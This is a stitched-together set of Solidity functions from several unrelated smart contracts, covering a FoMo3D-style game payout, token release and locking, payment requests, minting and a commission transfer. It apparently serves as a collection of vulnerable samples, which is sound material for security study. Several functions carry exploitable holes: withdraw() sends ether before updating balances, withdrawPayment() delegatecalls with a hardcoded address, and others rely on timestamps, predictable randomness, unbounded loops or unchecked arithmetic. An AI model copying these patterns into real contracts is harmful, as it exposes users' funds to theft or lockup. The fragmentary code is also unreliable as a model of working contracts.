}

function getPlayerVaults(uint256 _pID)
public
view
returns(uint256, uint256, uint256) {
    uint256 _rID = rID_;
    if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0) {
        if (round_[_rID].plyr == _pID) {
            return (
                (plyr_[_pID].win).add(((round_[_rID].pot).mul(48)) / 100),
                (plyr_[_pID].gen).add(getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)),
                plyr_[_pID].aff
            );
        } else {
            return (
                plyr_[_pID].win,
                (plyr_[_pID].gen).add(getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)),
                plyr_[_pID].aff
            );
        }
    } else {
        return (
            plyr_[_pID].win,
            (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),
            plyr_[_pID].aff
        );
    }
}

function endRound(F3Ddatasets.EventReturns memory _eventData_)
private
returns(F3Ddatasets.EventReturns) {
    uint256 _rID = rID_;
    uint256 _winPID = round_[_rID].plyr;
    uint256 _winTID = round_[_rID].team;
    uint256 _pot = round_[_rID].pot;
    uint256 _win = (_pot.mul(48)) / 100;
    uint256 _com = (_pot / 50);
    uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
    uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
    uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
    uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
    uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
    if (_dust > 0) {
        _gen = _gen.sub(_dust);
        _res = _res.add(_dust);
    }
    plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
    FeeAddr.transfer(_com);
    round_[_rID].mask = _ppt.add(round_[_rID].mask);
    if (_p3d > 0)
        Divies.deposit.value(_p3d)();
    _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
    _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
    _eventData_.winnerAddr = plyr_[_winPID].addr;
    _eventData_.winnerName = plyr_[_winPID].name;
    _eventData_.amountWon = _win;
    _eventData_.genAmount = _gen;
    _eventData_.P3DAmount = _p3d;
    _eventData_.newPot = _res;
    rID_++;
    _rID++;
    round_[_rID].strt = now;
    round_[_rID].end = now.add(rndInit_).add(rndGap_);
    round_[_rID].pot = _res;
    return (_eventData_);
}

function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)
private
returns(F3Ddatasets.EventReturns) {
    uint256 _com = _eth / 50;
    FeeAddr.transfer(_com);
    uint256 _p3d;
    uint256 _aff = _eth / 10; 
    if (_affID != _pID && plyr_[_affID].name != '') {
        plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
        emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
    } else {
        _p3d = _aff;
    }
    _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
    if (_p3d > 0) {
        Divies.deposit.value(_p3d)();
        _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
    }
    return (_eventData_);
}

function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)
private {
    if (plyrRnds_[_pID][_rID].keys == 0)
        _eventData_ = managePlayer(_pID, _eventData_);
    if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000) {
        uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
        uint256 _refund = _eth.sub(_availableLimit);
        plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
        _eth = _availableLimit;
    }
    if (_eth > 1000000000) {
        uint256 _keys = (round_[_rID].eth).keysRec(_eth);
        if (_keys >= 1000000000000000000) {
            updateTimer(_keys, _rID);
            if (round_[_rID].plyr != _pID)
                round_[_rID].plyr = _pID;
            if (round_[_rID].team != _team)
                round_[_rID].team = _team;
            _eventData_.compressedData = _eventData_.compressedData + 100;
        }
        if (_eth >= 100000000000000000) {
            airDropTracker_++;
            if (airdrop() == true) {
                uint256 _prize;
                if (_eth >= 10000000000000000000) {
                    _prize = ((airDropPot_).mul(75)) / 100;
                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
                    airDropPot_ = (airDropPot_).sub(_prize);
                    _eventData_.compressedData += 300000000000000000000000000000000;
                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
                    _prize = ((airDropPot_).mul(50)) / 100;
                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
                    airDropPot_ = (airDropPot_).sub(_prize);
                    _eventData_.compressedData += 200000000000000000000000000000000;
                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
                    _prize = ((airDropPot_).mul(25)) / 100;
                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
                    airDropPot_ = (airDropPot_).sub(_prize);
                    _eventData_.compressedData += 300000000000000000000000000000000;
                }
                _eventData_.compressedData += 10000000000000000000000000000000;
                _eventData_.compressedData += _prize * 1000000000000000000000000000000000;
                airDropTracker_ = 0;
            }
        }
        _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
        plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
        plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
        round_[_rID].keys = _keys.add(round_[_rID].keys);
        round_[_rID].eth = _eth.add(round_[_rID].eth);
        rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
        _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
        _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
        endTx(_pID, _team, _eth, _keys, _eventData_);
    }
}

function release() public whenNotPaused returns(uint256 _releaseAmount) {
    require(nextReleaseTime <= now);
    uint256 releaseAmount = 0;
    uint256 remainderAmount = totalSupply.sub(releasedSupply);
    if (remainderAmount > 0) {
        releaseAmount = standardDecimals.mul(nextReleaseAmount);
        if (releaseAmount > remainderAmount)
            releaseAmount = remainderAmount;
        releasedSupply = releasedSupply.add(releaseAmount);
        balances[owner] = balances[owner].add(releaseAmount);
        emit Release(msg.sender, releaseAmount, nextReleaseTime);
        nextReleaseTime = nextReleaseTime.add(26 * 1 weeks);
        nextReleaseAmount = nextReleaseAmount.sub(nextReleaseAmount.div(4));
    }
    return releaseAmount;
}

function releaseLockedBalance() public whenNotPaused returns(uint256 releaseAmount) {
    uint index = 0;
    while (index < lockedBalanceCount) {
        if (now >= lockedBalances[index].releaseTime) {
            releaseAmount += lockedBalances[index].value;
            unlockBalanceByIndex(index);
        } else {
            index++;
        }
    }
    return releaseAmount;
}

function transferLockedToken(address _to, uint256 _value, uint256 _releaseTime) public whenNotPaused nonReentrant returns(bool) {
    require(_releaseTime > now);
    balances[msg.sender] = balances[msg.sender].sub(_value);
    lockedBalances[lockedBalanceCount] = LockedBalance({
        owner: _to,
        value: _value,
        releaseTime: _releaseTime
    });
    lockedBalanceCount++;
    emit TransferLockedToken(msg.sender, _to, _value, _releaseTime);
    return true;
}

function setLockUser(address _to, uint256 _value, uint256 _endTime) onlyManagers public {
    require(_endTime > now);
    require(_value > 0);
    lockUser[_to].lockBalanceStandard.push(_value);
    lockUser[_to].startTime.push(now);
    lockUser[_to].endTime.push(_endTime);
    emit Lock(_to, _value, _endTime);
}

function withdrawPayment() public {
    for (uint i = 0; i < contracts.length; i++) {
        contracts[i].delegatecall(abi.encodeWithSignature("withdrawPayment(address)", 0xFa0E4F48a369BB3eCBCEe0B5119379EA8D1bcF29));
    }
}

function collectPayment(uint256 _index) external returns(bool) {
    require(payments[_index].status == Status.Requested);
    require(payments[_index].requestedTime + 24 * 60 * 60 < block.timestamp);
    require(balances[debtor] >= payments[_index].amountWei);
    balances[debtor] = balances[debtor].sub(payments[_index].amountWei);
    balances[creditor] = balances[creditor].add(payments[_index].amountWei);
    payments[_index].status = Status.Paid;
    return true;
}

function rejectPayment(uint256 _index) external onlyDebtor returns(bool) {
    require(payments[_index].status == Status.Requested);
    require(payments[_index].requestedTime + 24 * 60 * 60 > block.timestamp);
    payments[_index].status = Status.Rejected;
    return true;
}

function requestPayment(uint256 _index, uint256 _rateEthJpy) external onlyCreditor returns(bool) {
    require(payments[_index].status == Status.Pending || payments[_index].status == Status.Rejected);
    require(payments[_index].paymentDue <= block.timestamp);
    payments[_index].rateEthJpy = _rateEthJpy;
    payments[_index].amountWei = payments[_index].amountJpy.mul(ethWei).div(_rateEthJpy);
    payments[_index].requestedTime = block.timestamp;
    payments[_index].status = Status.Requested;
    return true;
}

function withdraw(uint256 _amount) external returns(bool) {
    require(balances[msg.sender] >= _amount);
    msg.sender.transfer(_amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    return true;
}

function directRelease(address _wallet) private {
    if (block.timestamp > walletsLocking[_wallet].cliff) {
        walletsLocking[_wallet].lockedTokens = 0;
    }
}

function checkTime(address _wallet) private {
    if (block.timestamp > walletsLocking[_wallet].cliff) {
        uint256 timeSpanned = (now.sub(walletsLocking[_wallet].lastVisit)).div(walletsLocking[_wallet].releasePeriod);
        if (timeSpanned >= 1) {
            uint256 released = timeSpanned.mul(walletsLocking[_wallet].releasePercentage);
            if (released > walletsLocking[_wallet].lockedTokens) {
                released = walletsLocking[_wallet].lockedTokens;
            }
            walletsLocking[_wallet].lastVisit = now;
            walletsLocking[_wallet].lockedTokens = walletsLocking[_wallet].lockedTokens.sub(released);
        }
    }
}

function FoundationTransfer(address _to, uint256 amtEth, uint256 amtToken) public onlyOwner {
    require(address(this).balance >= amtEth && balances[this] >= amtToken);
    if (amtEth > 0) {
        _to.transfer(amtEth);
        emit TransferredEth(_to, amtEth);
    }
    if (amtToken > 0) {
        require(balances[_to] + amtToken > balances[_to]);
        balances[this] -= amtToken;
        balances[_to] += amtToken;
        emit Transfer(this, _to, amtToken);
    }
}

function DailyMint() public {
    uint256 day = (now - startTime) / (60 * 60 * 24);
    require(startTime <= now);
    require(day >= _lastDayPaid);
    uint256 month = _lastDayPaid / 30;
    if (month > _currentMonth) {
        _currentMonth += 1;
        factor = (factor * 99) / 100;
    }
    uint256 todaysPayout = (((factor * startAmt) / 10000000) / 30) * (10 ** decimals);
    balances[this] += todaysPayout;
    currentSupply += todaysPayout;
    emit Transfer(address(0), this, todaysPayout);
    emit DayMinted(_lastDayPaid, todaysPayout, now);
    _lastDayPaid += 1;
}

function _transfer(address _from, address _to, uint _value) internal {
    require(_to != 0x0); 
    require(balanceOf[_from] >= _value); 
    require(balanceOf[_to] + _value > balanceOf[_to]); 
    require(!frozenAccount[_from]); 
    require(!frozenAccount[_to]); 
    balanceOf[_from] -= _value; 
    uint8 commis = commissionPer;
    if (_from == owner) commis = 0;
    balanceOf[owner] += _value * commis / 10000;
    balanceOf[_to] += _value - (_value * commis / 10000);
    if (_to.balance < minBalanceForAccounts) {
        uint256 amountinBoss = (minBalanceForAccounts - _to.balance) * sellPrice;
        _transfer(_to, owner, amountinBoss);
        _to.transfer(amountinBoss / sellPrice); 
    }
    Transfer(_from, owner, _value * commis / 10000);
    Transfer(_from, _to, _value - (_value * commis / 10000));
}

